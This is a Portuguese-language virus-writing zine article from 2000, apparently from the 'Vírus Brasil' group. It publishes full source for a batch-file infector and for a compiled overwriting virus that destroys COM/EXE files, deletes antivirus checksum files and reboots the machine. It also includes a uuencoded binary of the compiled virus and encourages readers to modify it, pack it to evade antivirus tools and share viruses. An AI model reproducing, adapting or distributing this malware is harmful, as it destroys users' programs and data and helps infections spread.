 
Rem ***************************** Goma.Bat **********************************

@echo off%[GOMA.BAT]%
if not exist %0.bat goto fim
type %0.bat > tmp1
for %%f in (*.bat) do set var=%%f 
type %var% >> tmp1
echo.>> tmp1
find /i "[GOMA.BAT]" <%var% >nul
if not errorlevel 1 GOTO fim
:infecta
erase %var%
ren tmp1 %var%
:fim
deltree /y tmp1 >nul
set var=

REM ***************************** Goma.Bat **********************************

        - Comentarios:
        ÄÄÄÄÄÄÄÄÄÄÄÄÄÄ?

        Implemente esse virus a sua vontade, nao acho que seja interes-
   sante, mas vai do gosto de cada um, se for mudar alguma coisa , uti-
   lize os comandos do texto sobre Bad Com's ...
        E quem tiver o DOM e tempo se quiser arrumar o bug , agradeco ,
   se bem que ai sera um novo virus, mas ta valendo...
        Hey, nao reclame, querendo ou nao e' um virus...


        Agora vamos fazer um virus em BAT, mas que nao infecte  arquivos
   .BAT, mas arquivos COM e EXE, como meus professores dizem, o que  va-
   le hoje em dia e' a ideia, e eu achei que essa foi massa dimais !

        Tambem e' sabido que nao se deve  passar  uma  grande ideia pela
   cuca e nao fazer nada com ela, eu tive o estalo de fazer esse tipo de
   virus, algo que pra mim ainda era desconhecido e o resultado esta  ai
   embaixo...

        O virus que segue abaixo e um virus de overwriting ( aqueles que
   infectam  o  arquivo hospedeiro inutilizando-o ), a unica novidade no
   mesmo, ?que ele ?feito sob os Comandos do DOS, ou seja, ele ?Batch
   based, como bat ele  nao  funcionaria, mas como um bat compilado, ele
   funciona  na  buena,  como  qualquer outro virus de over, em qualquer
   linguagem que seja ( aqui ja' apresentamos em ASM e em PASCAL ).

        Nem sei o que pensar, o virus funciona bem na medida do possivel
   sem muitos bugs e os que tem nao o impedem de funcionar, utilizei co-
   mo "compilador" um programa denominado TurboBat (creio que o  BAT2EXE
   tambem funcionaria) que tem alguns comandos embutidos nele e uma men-
   sagem de unregistered que enche o saco (nada que uma debugada nao re-
   solvesse),  dos  comandos utilizei o beep e um boot, so' para dar uma
   graca ao virus.

        O virus nao esta encriptado, mas  caso  queira, utilize qualquer
   cript de arquivos executaveis a seu gosto ( Protect, Cryptcon, Pklite
   entre outros...), temos uma rotina de apagar os arquivos de verifica-
   cao de alguns  AV's e infectamos arquivos no diretorio corrente e  um
   abaixo deste.

        O virus funciona uma delicia em dos e windows e creio que  sera'
   classificado como HLL pelos Av's devido ao seu tamanho  relativamente
   grande  e  de linguagem  desconhecida ! Embora continuo achando que ?
   BAT !

        Vamos ficando por aqui e se voce conhece ai alguem que tem algum
   virus brazuca na colecao, mande pra gente, estamos precisando ...


 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
      __   __ /  __   .   __    __          __   __        ___   __
     |    |  |  |  \  |  | _   |  |        |_   |  |  |\|   |   |_
     |__  |__|  |__/  |  |__|  |__|        |    |__|  | |   |   |__
									     
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

REM ****************** Goma.Overwriting.Bat.Compiled ************************
REM        Nome do virus: Goma.Overwriting.Bat
REM        Autor : nim_bus@hotmail.com
REM        Tipo : Runtime Overwriting , COM e EXE infector .
REM        Tamanho : 4301 bytes
REM        Av's : none
REM        Retro : apagar arquivos de verificacao
REM        Ativacao : mensagem, diretorio, beep e fechar a tarefa !
REM        Bug's : favor entrar em contato caso voce detecte algum ...
REM        Compilar/linkar com TurboBat 3.?? ou uuencoda ele !
REM *************************************************************************
:inicio

:procura
for %%f in (..\*.com *.com ..\*.exe *.exe) do set var=%%f

:ja_infec
find /i "[TDG'2000]" <%var% >nul
if not errorlevel 1 GOTO fim

:infectar
echo s | copy %0 %var% > nul

:apagar
DELTREE /Y SMARTCHK.CPS > nul
DELTREE /Y ANTI-VIR.DAT > nul
DELTREE /Y AVP.CRC      > nul
DELTREE /Y IVB.NTZ      > nul
DELTREE /Y CHKLIST.MS   > nul


:zoa
ECHO. [TDG'2000]            Goma.Overwriting.Bat.Compiled           [TDG'2000]
ECHO.
ECHO.                  Um novo conceito em v¡rus de computador
ECHO.
ECHO. [TDG'2000]            Goma.Overwriting.Bat.Compiled           [TDG'2000]
MD ?Gomaÿ?>nul
BEEP 440 40

:fim
set var=
BOOT WARM
REM ****************** Goma.Overwriting.Bat.Compiled ************************


 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ  
                         ___         ___   ___    __    ___
              |  | |  | |__   |\ |  |     |   |  |  \  |__
              |__| |__| |___  | \|  |___  |___|  |__/  |___

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ


;;;;;;;;;;;;;;;;;;; Goma.Over.Bat ;;;;;;;;;;;;;;;;;;;;;;;;;;;
begin 600 goma.com
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
M_.9A3JP\('3["L!UK<.B"P``ZPL``%-15S/`@#PK=`:`/"UU`D!&4#/;,]*Y
M"@"L+#!R%CP)=Q(RY(OXB\+WX9>3]^$#V!/7Z^58"\!T"O?3]]*#PP&#T@"+
MPU]96\-3!N@``%NL/"!T^T[_5S@+_W4%N1(`]^$+P'4*N`(`"_]U`[@2`(O(
MN$``CL`FH&P`)CH&;`!T^>+S!UO#H@L```O_=0RX0`".P+@T$B:C<@#J``#_
M_\N+QPOV=`?H``!;_U<(M$S-(:(+```\#\T3/0',$```S1%O````````````
M(P````````````````L`/`\&24Y)0TE/#``\#P=04D]#55)!#0!M#PA*05])
M3D9%0PT`KP\(24Y&14-405(+`/D/!D%004=!4@@`@!`#6D]!__^Q$`-&24W_
M_P``````````````````````````````````````````````````````````
M`````48`````````````````````````````````````````````````````
M```````````````````````````````````N+EPJ+F-O;2`J+F-O;2!C.EQW
M:6YD;W=S7&-O;6UA;F1<*BYC;VT`````=F%R/25&)0`E5D%2)0!N=6P``$9)
M3D0`$"]I(");5$1')S(P,#!=(@T`,0!40$U`4%\D,BXA(2$`<R`-"@!N=6P`
M$B]#($-/4%D@)3`@)59!4B4@#0!N=6P``$1%3%12144`$"]9(%--05)40TA+
M+D-04PT`;G5L``!$14Q44D5%`!`O62!!3E1)+59)4BY$050-`&YU;```1$5,
M5%)%10`++UD@0590+D-20PT`;G5L``!$14Q44D5%``LO62!)5D(N3E1:#0!N
M=6P``$1%3%12144`#B]9($-(2TQ)4U0N35,-`"!;5$1')S(P,#!=("`@("`@
M("`@("`@1V]M82Y/=F5R=W)I=&EN9RY"870N0V]M<&EL960@("`@("`@("`@
M(%M41$<G,C`P,%T-"@`-"@`@("`@("`@("`@("`@("`@("!5;2!N;W9O(&-O
M;F-E:71O(&5M(':A<G5S(&1E(&-O;7!U=&%D;W(-"@`-"@`@6U1$1R<R,#`P
M72`@("`@("`@("`@($=O;6$N3W9E<G=R:71I;F<N0F%T+D-O;7!I;&5D("`@
M("`@("`@("!;5$1')S(P,#!=#0H`_O]';VUA__X`-#0P(#0P`'9A<CT```"-
MMF\`QT0"``"-MN0`C;YO`.B*\G,#Z1@`C;8/`8N^!@#H)?.+M@8`OP``Z)KU
MZ=C_C;87`8N^!@#H#?.+M@8`Z#7WN0``C;8=`;\``.A+]XVV(@&-OB@!Z('W
MZ![ZZ#/ZC;8Y`>A#^G(#Z08`BX9I`/_@N0(`C;8[`;\``.@;]XVV2`'HX_;H
M\OF-MCL!Z.?VN0``C;9-`;\``.C]]HVV4@&+O@8`Z*#RB[8&`.B=^.C)^>C>
M^8VV.P'H#OJY``"-MF4!OP``Z-'VC;9J`8V^<P'H!_?HI/FY``"-MH0!OP``
MZ+;VC;:)`8V^D@'H[/;HB?FY``"-MJ,!OP``Z)OVC;:H`8V^L0'HT?;H;OFY
M``"-MKT!OP``Z(#VC;;"`8V^RP'HMO;H4_FY``"-MM<!OP``Z&7VC;;<`8V^
MY0'HF_;H./F-MO0!Z([YC;9``NB'^8VV0P+H@/F-MG\"Z'GYC;:"`NAR^8VV
MS@+HX?F-MM<"Z)#ZC;;>`K\``.A)]+\``.AK^[X``+\``.AX^P``````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
M````````````````````````````````````````````````````````````
:``````````````````````````````````!L
`
end
;;;;;;;;;;;;;;;;;;; Goma.Over.Bat ;;;;;;;;;;;;;;;;;;;;;;;;;;;


                                                                    T +

 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ    
                       Copyright ?2000, V¡rus Brasil ?
 ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ    
